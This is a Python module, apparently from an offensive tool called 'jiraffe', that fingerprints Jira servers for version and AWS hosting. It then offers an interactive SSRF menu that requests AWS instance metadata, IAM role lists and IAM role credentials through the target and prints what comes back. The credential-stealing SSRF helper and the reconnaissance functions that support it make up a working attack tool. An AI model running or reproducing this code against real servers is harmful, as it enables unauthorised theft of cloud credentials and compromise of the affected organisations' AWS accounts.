#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import socket
import re
import bs4
from requests import RequestException
from urllib.parse import urlparse, urljoin
from packaging import version as pkg_version
from typing import Optional
from jiraffe.style import Style
from jiraffe.constants import (
    AWS_METADATA,
    AWS_IAM_DATA,
    AWS_IAM_CRED
)


SEMVER_RE = re.compile(r"(\d+\.\d+(?:\.\d+)?)")

def normalize_version(raw: str) -> Optional[str]:
    """
    Extract semantic version from arbitrary Jira version strings.
    Examples:
      '(v4.4.5)'      -> '4.4.5'
      'JIRA 8.13.4'   -> '8.13.4'
      'v7.6'          -> '7.6'
    """

    if not raw:
        return None

    match = SEMVER_RE.search(raw)
    if not match:
        return None

    return match.group(1)

def uparse(target: str) -> str:
    url = urlparse(target)
    if not url.scheme or not url.netloc:
        return target
    return f"{url.scheme}://{url.netloc}{url.path or ''}"

def isjira(target, client) -> bool:
    r = client.get(target)

    # Network / TLS failure
    if isinstance(r, RequestException):
        return False

    indicators = (
        "ajs-" in r.text,
        "atlassian-token" in r.text,
        "jira" in r.text.lower()
    )

    return sum(indicators) >= 1

def isaws(target: str) -> bool:
    """
    Best-effort AWS hosting detection.
    Heuristic only: may return false negatives.
    """
    try:
        host = urlparse(target).netloc

        # Reverse DNS
        try:
            rdns = socket.gethostbyaddr(host)[0]
            if "amazonaws" in rdns.lower():
                return True
        except Exception:
            pass

        # Direct hostname hints
        if any(x in host.lower() for x in (
            "amazonaws",
            "elb.amazonaws",
            "compute.amazonaws",
        )):
            return True

        return False

    except Exception:
        return False

def getversion(target, client=None):
    """
    Best-effort Jira version detection.
    Returns string version or None.
    """
    try:
        if client:
            r = client.get(target)
            html = r.text
        else:
            import requests
            html = requests.get(target).text
    except Exception:
        return None

    soup = bs4.BeautifulSoup(html, "html.parser")
    candidates = []

    # modern Jira (AJS data attributes)
    for tag in soup.find_all(attrs={"data-version": True}):
        candidates.append(tag["data-version"])

    # footer build info from login page
    footer = soup.find("span", {"id": "footer-build-information"})
    if footer:
        candidates.append(footer.get_text().split("#")[0].strip())

    # meta tags (old Jira)
    for meta in soup.find_all("meta"):
        name = meta.get("name", "").lower()
        content = meta.get("content", "")
        if name in ("ajs-version-number", "version"):
            candidates.append(content.strip())

    # page title (very old Jira)
    title = soup.title.string if soup.title else ""
    match = re.search(r"JIRA\s+([\d.]+)", title)
    if match:
        candidates.append(match.group(1))

    # REST fallback (works on many versions)
    try:
        if client:
            r = client.get(urljoin(target, "/rest/api/2/serverInfo"))
            if not isinstance(r, Exception) and r.status_code == 200:
                data = r.json()
                if "version" in data:
                    candidates.append(data["version"])
    except Exception:
        pass

    normalized = []

    for v in candidates:
        clean = normalize_version(v)
        if clean:
            normalized.append(clean)

    if not normalized:
        return None

    try:
        parsed = [pkg_version.parse(v) for v in normalized]
        return str(max(parsed))
    except Exception:
        return normalized[0]

# Shared AWS SSRF menu
def aws_ssrf_menu(target, client):
    base = target.rstrip("/")

    print(Style.YELLOW("[*] AWS SSRF helper"))
    print(
        "  1. Instance metadata\n"
        "  2. IAM roles list\n"
        "  3. IAM role credentials\n"
        "  4. Custom SSRF URL"
    )

    try:
        choice = input("\n----> ").strip()

        if choice == "1":
            label = "AWS metadata"
            r = client.get(base + AWS_METADATA)

        elif choice == "2":
            label = "IAM roles"
            r = client.get(base + AWS_IAM_DATA)

        elif choice == "3":
            role = input("Role name: ").strip()
            label = f"IAM credentials ({role})"
            r = client.get(base + AWS_IAM_CRED % role)

        elif choice == "4":
            custom = input("SSRF path or URL: ").strip()
            label = "Custom SSRF"
            r = client.get(base + custom)

        else:
            print(Style.RED("[-] Invalid selection"))
            return

        print(
            Style.GREEN(f"[+] {label} response ")
            + Style.YELLOW(f"(HTTP {r.status_code})")
        )

        if r.text.strip():
            print(Style.CYAN(r.text))
        else:
            print(Style.YELLOW("[!] Empty response"))

    except KeyboardInterrupt:
        print(Style.RED("Interrupted."))
        sys.exit(0)
